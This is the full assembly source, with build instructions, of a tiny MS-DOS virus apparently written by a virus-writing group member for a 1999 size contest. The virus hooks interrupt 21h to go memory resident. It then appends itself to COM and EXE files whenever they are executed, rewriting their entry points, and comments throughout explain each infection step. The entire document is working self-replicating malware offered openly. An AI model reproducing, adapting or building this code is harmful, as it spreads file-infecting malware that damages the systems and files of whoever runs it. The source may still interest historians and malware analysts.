;THIS VIRUS WAS WRITTEN FOR THE TINY'99 VIRUS CONTEST
;Made by Super/29A


;This virus is a reduced version of my Small virus that appeared in vlad#5

;At that moment it was 168 bytes long.
;Now its 145 bytes!!!

;This virus should work in all versions of msdos, including dos sessions
;inside win3.x/win9x  I havent tested in winNT.
;It infects COM &amp; EXE files, without reinfecting them.
;It goes memory resident (only one time, of course)



;thanks to DARKMAN for his 1 byte optimization
;i dont know what i could do without him  :-D


;to compile:
;tasm /m29A small.asm
;tlink /t small

.286            ;
.model small    ;yeah! small! as always  :D
.code           ;code starts here... no data  X-D
;--------------------------------------------------------------------------

             org 100h   ;only for COM, the first generation
vir_start:

;Before starting a DOS program, the registers should have the following value:
;eax=00000000
;ebx=00000000
;ecx=000000ff
;dx=ds=es
;esi=eip
;edi=esp
;ebp=0912 (in pure dos)
;   =091c (in windows dos session)


;if u run it with debug... forget it!  X-DD

EXE_entry: ;here starts execution in EXE infected files
             mov al,10h ;due to PSP
             db 3ch     ;CMP AL,xx
COM_entry:
             add si,[si+1]      ;when executing a COM file ESI get value of virus COM_entrypoint
                                ;in EXE files it skips this 3 bytes
             add ax,1234h
             org $-2
new_cs:      dw 0fff0h          ;add relative CS to get the old CS of host (in both COM &amp; EXE files)
             add ax,dx          ;add PSP
             push ax            ;push it (for later retf)
             push 1234h
             org $-2
new_ip:      dw 00000h          ;push IP (for later give control to host with retf)

             mov es,bx          ;ES=0000
             mov ax,220h+(int21-vir_start)      ;EAX=lineal address of int21

             mov di,84h         ;int21 vector in interrupt table
             db 66h
             xchg ax,es:[di]    ;set int21 to int21 virus entry (0020:003C)

             scasw
             jz exit_to_host    ;test if int21 is the same address as the virus
                                ;warning! dont run other program that hooks
                                ;int21 after the virus

             mov di,220h        ;start of virus in memory
             mov cl,vir_size    ;virus size=145 bytes = 91h bytes
             rep movs byte ptr es:[di],cs:[si]  ;copy virus to mem (hole in
                                                ;interrupt table)

             db 66h
             stosw      ;store old int21 handler

exit_to_host:
             mov es,dx  ;restore ES

             retf       ;return control to host


infect_exe:
             shl dx,0ch         ;DX=new CS
             sub dx,[si-1+8h]   ;Adjust for the header size

             xchg dx,[si-1+16h] ;Store new CS and get old one
             xchg bp,[si-1+14h] ;Store new IP and get old one

             add byte [si-1+2h],cl      ;Calculate part-page at EOF
                                        ;It does not reinfect because
                                        ; the carrier flag will be set
                                        ; and tested in &quot;write_jump&quot;

             jmp short write_jump


;here starts virus int21
;its address is 0020:003c  (equivalent to linear address 0000025c)

int21:
             pusha      ;Save registers
             push ds
             sub ax,4b00h       ;Infect on execute
             jnz exit_int21

infect:
             xchg si,ax    ;SI=0000
                             ;Open file ---&gt;BX=handle
             mov ax,3d92h    ;  bits 0-2=2--&gt; read &amp; write access
             int 21h         ;  bits 4-6=1--&gt; prohibit access by others
             xchg bx,ax      ;  bit 7=1--&gt; private for current process

             mov ah,3fh       ;
             mov cx,20h       ; Read first 20h bytes from the file
             mov ds,cx        ;
             cwd              ; (DS:DX=0020:0000)
             int 21h          ;

             xor cx,cx
             mov ax,4202h    ; Seek to EOF
             int 21h         ; (CX &amp; DX are already zero)

             mov cl,vir_size    ;virus length

             xchg ax,bp ;save in BP the value of AX (low word of file size)

             lodsb      ;get first byte of file

             cmp al,'M'
             jz infect_exe      ;in case of MZ header jump to infect file

infect_com:
             cmp al,0e9h        ;the COM file must start by a jump
             jnz close

             xchg bp,[si]    ; Store the jump to the virus
             add bp,103h    ; Calculate the offset where the program jumps
             cmp [si],bp    ; Test if the file is infected
                            ; (if the jump is 100h bytes before the EOF)
write_jump:
             jb close    ; Exit if the file is already infected

             mov [si-1+20h+(new_ip-vir_start)],bp    ; Store the program entry point
             mov [si-1+20h+(new_cs-vir_start)],dx    ;

             mov dx,ds    ; (0020:0020 is the start of the code)
write_again:
             mov ah,40h    ; Write virus to the end of the file
             int 21h       ; (CX is already the length of the virus)

write_hdr:
             mov ax,4200h    ;
             cwd             ; Seek to the start of file
             mov cx,dx       ;
             int 21h         ;

             mov cx,ds     ; (DX is already zero)
             inc si
             jnp write_again    ;go and write the start of modified file
                                ;or should i say infected file  ;-D

close:
             mov ah,3eh    ; Close file
             int 21h       ;

exit_int21:
             pop ds
             popa     ; Restore registers

             db 0eah    ; Far jump to old interrupt 21

vir_end:
vir_size equ offset vir_end - offset vir_start
end vir_start
;--------------------------------------------------------------------------
